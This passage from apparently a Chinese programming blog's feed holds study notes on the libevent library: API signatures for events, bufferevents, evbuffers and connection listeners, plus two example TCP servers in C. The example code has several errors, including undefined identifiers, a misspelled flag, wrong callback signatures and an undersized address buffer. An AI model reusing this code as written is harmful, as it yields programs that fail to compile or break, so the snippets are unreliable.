class="hljs-keyword">struct</span> event *event, <span class="hljs-type">int</span> priority)</span>;<br></code></pre></td></tr></table></figure></li><li><p>3.bufferevent</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> bufferevent *<span class="hljs-title function_">bufferevent_socket_new</span><span class="hljs-params">(</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> event_base *base,</span><br><span class="hljs-params">    <span class="hljs-type">evutil_socket_t</span> fd,</span><br><span class="hljs-params">    <span class="hljs-keyword">enum</span> bufferevent_options options)</span>;<span class="hljs-comment">//创建一个bufferevent</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_socket_connect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> sockaddr *address, <span class="hljs-type">int</span> addrlen)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev)</span>;<span class="hljs-comment">//释放一个bufferevent</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_enable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">short</span> events)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_disable</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">short</span> events)</span>;<span class="hljs-comment">//屏蔽bufferevent对应的触发事件</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bufferevent_setwatermark</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">short</span> events,</span><br><span class="hljs-params">    <span class="hljs-type">size_t</span> lowmark, <span class="hljs-type">size_t</span> highmark)</span>;<span class="hljs-comment">//设置bufferevent 读写操作水位</span><br><span class="hljs-keyword">struct</span> evbuffer *<span class="hljs-title function_">bufferevent_get_input</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev)</span>;<br><span class="hljs-keyword">struct</span> evbuffer *<span class="hljs-title function_">bufferevent_get_output</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev)</span>;<span class="hljs-comment">//获取bufferevent对象的evbuffer结构体</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_write_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<span class="hljs-comment">//向bufferevent中读取或者写入数据</span><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">bufferevent_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">bufferevent_read_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<br></code></pre></td></tr></table></figure></li><li><p>4.evBuffer</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> evbuffer *<span class="hljs-title function_">evbuffer_new</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">evbuffer_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<span class="hljs-comment">//创建或者释放一个evbuffer</span><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">evbuffer_get_length</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> evbuffer *buf)</span>;<span class="hljs-comment">//得到evbuffer当前的数据长度</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">evbuffer_add</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *buf, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> datlen)</span>;<span class="hljs-comment">//将数据data加入到buf的末尾</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">evbuffer_add_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *dst, <span class="hljs-keyword">struct</span> evbuffer *src)</span>;<span class="hljs-comment">//将 src 中的所有数据移动到 dst 末尾,成功时返回0,失败时返回-1。</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">evbuffer_remove_buffer</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evbuffer *src, </span><br><span class="hljs-params">                    <span class="hljs-keyword">struct</span> evbuffer *dst,</span><br><span class="hljs-params">                    <span class="hljs-type">size_t</span> datlen)</span>;<span class="hljs-comment">//函数从 src 中移动 datlen 字节到 dst 末尾,尽量少进行复制。如果字节数小于 datlen,所有字节被移动。函数返回移动的字节数。</span><br><br></code></pre></td></tr></table></figure></li><li><p>5.evconnlistener</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> evconnlistener *<br><span class="hljs-title function_">evconnlistener_new</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,</span><br><span class="hljs-params">    evconnlistener_cb cb, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog,</span><br><span class="hljs-params">    <span class="hljs-type">evutil_socket_t</span> fd)</span>;<br><br><span class="hljs-keyword">struct</span> evconnlistener *<br><span class="hljs-title function_">evconnlistener_new_bind</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,</span><br><span class="hljs-params">    evconnlistener_cb cb, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, <span class="hljs-type">int</span> socklen)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">evconnlistener_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *lev)</span>;<span class="hljs-comment">//创建或者销毁一个evconnlistener</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*evconnlistener_cb)</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *listener,</span><br><span class="hljs-params">    <span class="hljs-type">evutil_socket_t</span> sock, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">int</span> len, <span class="hljs-type">void</span> *ptr)</span>;<span class="hljs-comment">//evconnlistener的回调函数</span><br><span class="hljs-type">evutil_socket_t</span> <span class="hljs-title function_">evconnlistener_get_fd</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *lev)</span>;<br><span class="hljs-keyword">struct</span> event_base *<span class="hljs-title function_">evconnlistener_get_base</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *lev)</span>;<span class="hljs-comment">//获取evconnlistener中获取fd或者event_base。</span><br><br></code></pre></td></tr></table></figure></li></ul><h4 id="2-3-基本使用步骤"><a href="#2-3-基本使用步骤" class="headerlink" title="2.3.基本使用步骤"></a>2.3.基本使用步骤</h4><ul><li><p>1.创建监听对象</p></li><li><p>2.创建监听事件</p></li><li><p>3.将监听事件加入监听集合</p></li><li><p>4.开始监听</p></li></ul><h4 id="2-4-实例"><a href="#2-4-实例" class="headerlink" title="2.4.实例"></a>2.4.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//服务器</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event2/listener.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_str</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> *port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    <span class="hljs-keyword">if</span> (inet_ntop(af, &amp;(addr_tmp-&gt;sin_addr), str_addr, SOCKLEN) == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    *port = ntohs(addr_tmp-&gt;sin_port);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//转换ip地址类型</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">convertip_to_net</span><span class="hljs-params">(<span class="hljs-type">int</span> af, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">char</span> *str_addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> port)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> *<span class="hljs-title">addr_tmp</span> =</span> (<span class="hljs-keyword">struct</span> sockaddr_in *) addr;<br>    addr_tmp-&gt;sin_port = htons(port);<br>    <span class="hljs-keyword">if</span> (inet_pton(af, str_addr, &amp;(addr_tmp-&gt;sin_addr)) != <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;convert ip failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//帮助信息</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">Usage</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Usage:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s SERVERADDR SERVERPORT\n&quot;</span>, str);<br>&#125;<br><br><span class="hljs-comment">//创建新的socket</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">NewSocket</span><span class="hljs-params">(<span class="hljs-type">char</span> *addr, <span class="hljs-type">char</span> *port, <span class="hljs-type">int</span> backlog)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">ADDR</span>;</span><br>    convertip_to_net(AF_INET, &amp;ADDR, addr, atoi(port));<br>    <span class="hljs-type">int</span> fd = socket(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (bind(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;ADDR, SOCKLEN) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;bind&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (listen(fd, backlog) != <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;listen&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> fd;<br>&#125;<br><span class="hljs-comment">//处理客户端请求</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">handler_cb</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">client</span>;</span><br>    <span class="hljs-type">int</span> client_fd = accept(fd, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;client, &amp;SOCKLEN);<br>    <span class="hljs-type">char</span> client_addr[<span class="hljs-number">15</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> client_port;<br>    convertip_to_str(AF_INET, &amp;client, client_addr, &amp;client_port);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;client:%s:%hu is connected!\n&quot;</span>, client_addr, client_port);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>) &#123;<br>Usage(argv[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-type">int</span> fd = NewSocket(argv[<span class="hljs-number">1</span>], argv[<span class="hljs-number">2</span>], <span class="hljs-number">10</span>);<br>    <span class="hljs-comment">//创建一个监听集合</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> event_base_new();<br>    <span class="hljs-comment">//创建一个事件</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event</span> *<span class="hljs-title">new_event</span> =</span> event_new(base, fd, EV_READ | EV_PERSIST, handler_cb, <span class="hljs-literal">NULL</span>);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timeval</span> <span class="hljs-title">timeout</span>=</span> &#123;<span class="hljs-number">450</span>,<span class="hljs-number">30</span>&#125;;<span class="hljs-comment">//设置超时时间</span><br>    <span class="hljs-comment">//注册事件</span><br>event_add(new_event, &amp;timeout);<br>    <span class="hljs-comment">//等待事件的发生</span><br>event_base_dispatch(base);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-连接监听器和数据缓冲区-evconnlistener-bufferevent"><a href="#3-连接监听器和数据缓冲区-evconnlistener-bufferevent" class="headerlink" title="3.连接监听器和数据缓冲区(evconnlistener,bufferevent)"></a>3.连接监听器和数据缓冲区(evconnlistener,bufferevent)</h3><h4 id="3-1-基本的使用步骤"><a href="#3-1-基本的使用步骤" class="headerlink" title="3.1.基本的使用步骤"></a>3.1.基本的使用步骤</h4><ul><li>1.创建一个事件监听器</li><li>2.设置事件触发的回调函数</li><li>3.开始监听事件</li></ul><h4 id="3-2-基本的API"><a href="#3-2-基本的API" class="headerlink" title="3.2.基本的API"></a>3.2.基本的API</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">//连接监听器</span><br><br><span class="hljs-comment">//创建一个新的socket并且绑定监听,返回一个struct evconnlistener类型</span><br><span class="hljs-keyword">struct</span> evconnlistener *<br><span class="hljs-title function_">evconnlistener_new_bind</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base, evconnlistener_cb cb,</span><br><span class="hljs-params">    <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa,</span><br><span class="hljs-params">    <span class="hljs-type">int</span> socklen)</span>;<br><br><span class="hljs-comment">//将创建好的socket开始监听</span><br>evconnlistener_new(<span class="hljs-keyword">struct</span> event_base *base,<br>    evconnlistener_cb cb, <span class="hljs-type">void</span> *ptr, <span class="hljs-type">unsigned</span> flags, <span class="hljs-type">int</span> backlog,<br>    <span class="hljs-type">evutil_socket_t</span> fd);<br><br>evconnlistener_disable(<span class="hljs-keyword">struct</span> evconnlistener *lev);<br>evconnlistener_enable(<span class="hljs-keyword">struct</span> evconnlistener *lev);<br><span class="hljs-comment">//重新设置回调函数</span><br>evconnlistener_set_cb(<span class="hljs-keyword">struct</span> evconnlistener *lev,<br>    evconnlistener_cb cb, <span class="hljs-type">void</span> *arg);<br><br><br><span class="hljs-comment">//创建缓冲区</span><br><span class="hljs-keyword">struct</span> bufferevent *<span class="hljs-title function_">bufferevent_socket_new</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> event_base *base,<span class="hljs-type">int</span> fd,<span class="hljs-type">int</span> option)</span>;<br><br><span class="hljs-comment">//设置回调函数</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title function_">bufferevent_setcb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev,</span><br><span class="hljs-params">    bufferevent_data_cb readcb, bufferevent_data_cb writecb,</span><br><span class="hljs-params">    bufferevent_event_cb eventcb, <span class="hljs-type">void</span> *cbarg)</span><br><br><span class="hljs-keyword">struct</span> bufferevent *<span class="hljs-title function_">bufferevent_connect</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev,</span><br><span class="hljs-params">    <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *sa, <span class="hljs-type">int</span> socklen)</span>;<br><span class="hljs-comment">//从libevent自行维护的缓冲区中读取数据</span><br><span class="hljs-type">size_t</span><br><span class="hljs-title function_">bufferevent_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><br><span class="hljs-comment">//向libevent自行维护的缓冲区中写入数据</span><br><span class="hljs-type">int</span><br><span class="hljs-title function_">bufferevent_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bufev, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> size)</span>;<br><br></code></pre></td></tr></table></figure><h4 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;event2/listener.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;strings.h&gt;</span></span><br><span class="hljs-comment">//读回调函数</span><br>bufferevent_data_cb <span class="hljs-title function_">read_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>];<br>    bufferevent_read(bev, buffer, <span class="hljs-number">10</span>);<span class="hljs-comment">//从接收缓冲区读取数据</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read buffer :%s\n&quot;</span>, buffer);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//写回调函数</span><br>bufferevent_data_cb <span class="hljs-title function_">write_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-type">char</span> *str = <span class="hljs-string">&quot;hello,world&quot;</span>;<br>    bufferevent_write(bev, str, <span class="hljs-built_in">strlen</span>(str) + <span class="hljs-number">1</span>);<span class="hljs-comment">//向客户端发送消息</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-comment">//异常处理函数</span><br>bufferevent_event_cb <span class="hljs-title function_">error_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bufferevent *bev, <span class="hljs-type">short</span> event, <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>evconnlistener_cb<br><span class="hljs-title function_">listen_cb</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> evconnlistener *listener, <span class="hljs-type">evutil_socket_t</span> fd, <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">int</span> socklen,</span><br><span class="hljs-params">          <span class="hljs-type">void</span> *arg)</span> &#123;<br>    <span class="hljs-comment">//这个回调函数传进来的fd为与客户端的通信的fd不是监听的fd</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> (<span class="hljs-keyword">struct</span> event_base *) arg;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bufferevent</span> *<span class="hljs-title">buffevent</span> =</span> bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);<span class="hljs-comment">//创建缓冲区</span><br>    bufferevent_setcb(buffevent, read_cb, write_cb, error_cb, <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//设置回调函数</span><br>    bufferevent_enable(bufferevent,EV_READ|EV_PRESIST|EV_WRITE);<span class="hljs-comment">//注册事件</span><br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-type">socklen_t</span> SOCKLEN = (<span class="hljs-type">socklen_t</span>) (<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr));<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">event_base</span> *<span class="hljs-title">base</span> =</span> event_base_new();<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> <span class="hljs-title">bind_addr</span>;</span><br>    convertip_to_net(AF_INET, &amp;bind_addr, <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">10000</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">evconnlistener</span> *<span class="hljs-title">listener</span> =</span> evconnlistener_new_bind(base, listen_cb, (<span class="hljs-type">void</span> *) base,<br>LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE_PORT, <span class="hljs-number">-1</span>,<br>&amp;bind_addr, SOCKLEN);<br>    event_base_dispatch(base);<span class="hljs-comment">//循环监听事件</span><br>    evconnlistener_free(listener);<span class="hljs-comment">//释放连接监听器</span><br>    event_base_free(base);<span class="hljs-comment">//释放监听集合;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>参考<a href="https://aceld.gitbooks.io/libevent/content/chapter1.html">https://aceld.gitbooks.io/libevent/content/chapter1.html</a></p>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>libev学习笔记</title>
    <link href="/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/04/17/libev%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
